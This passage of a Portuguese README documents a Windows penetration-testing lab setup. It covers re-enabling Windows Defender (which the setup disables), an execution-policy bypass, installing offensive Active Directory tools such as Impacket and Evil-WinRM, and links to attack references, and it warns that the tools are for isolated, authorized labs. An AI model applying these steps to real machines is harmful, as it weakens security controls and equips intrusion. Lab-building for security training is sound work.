grep                # Select-String
wget                # Invoke-WebRequest
cat                 # Get-Content
```

### **Configurações de Segurança**

⚠️ **ATENÇÃO:** O setup desativa Windows Defender. Use apenas em ambiente isolado!

**Reativar Defender:**

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableBehaviorMonitoring $false
Remove-MpPreference -ExclusionPath C:\Tools
```

**OU use o script de rollback:**

```cmd
cd C:\Users\Ziger\Documents\Scripts\Windows
.\rollback.bat
```

---

## 🔧 Troubleshooting

### **Erro: "Execution of scripts is disabled"**

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
```

### **Ferramentas .NET não compilam**

1. Instalar Visual Studio Community:
```powershell
choco install -y visualstudio2022community
choco install -y visualstudio2022-workload-manageddesktop
```

2. Abrir `.sln` no Visual Studio
3. Build > Build Solution

### **WSL2 não instala**

1. Habilitar virtualização na BIOS/UEFI
2. Executar:
```powershell
wsl --update
wsl --set-default-version 2
```
3. Reiniciar
4. Executar: `wsl --install -d kali-linux`

### **Impacket não funciona**

```bash
# Via WSL2
wsl -d kali-linux
cd /mnt/c/Tools/Tools/Impacket
pip3 install .
```

### **Evil-WinRM não encontrado**

```bash
gem install evil-winrm
# OU
choco install -y ruby
gem install evil-winrm
```

---

## 📚 Recursos de Aprendizado

### **Documentação Oficial**

- [BloodHound Docs](https://bloodhound.readthedocs.io/)
- [Rubeus Guide](https://github.com/GhostPack/Rubeus)
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
- [CrackMapExec Wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki)

### **Guias e Tutoriais**

- [HackTricks Windows](https://book.hacktricks.xyz/windows-hardening/)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Active Directory Security](https://adsecurity.org/)

### **Cursos e Labs**

- HackTheBox (máquinas Windows)
- TryHackMe (Active Directory rooms)
- Pentester Academy (Windows Exploitation)

---

## ⚠️ Avisos Importantes

1. **Use apenas em ambiente isolado/VM** - Nunca em sistema de produção
2. **Windows Defender desativado** - Sistema fica vulnerável
3. **Ferramentas podem ser detectadas** - Use em ambiente controlado
4. **Sempre documente** - Mantenha logs de todas as ações
5. **Respeite autorização** - Use apenas em sistemas autorizados

---

## 🎓 Próximos Passos

1. ✅ Instalar todas as ferramentas (setup-notebook2.ps1)
2. ✅ Compilar ferramentas .NET (Visual Studio)
3. ✅ Configurar WSL2 + Kali Linux
4. ✅ Testar BloodHound com dados de exemplo
5. ✅ Praticar workflows em ambiente de lab
6. ✅ Organizar estrutura de engagements

---

**Notebook 2 está pronto para ataques Windows realistas! 🔥**

**Última atualização:** Dezembro 2024












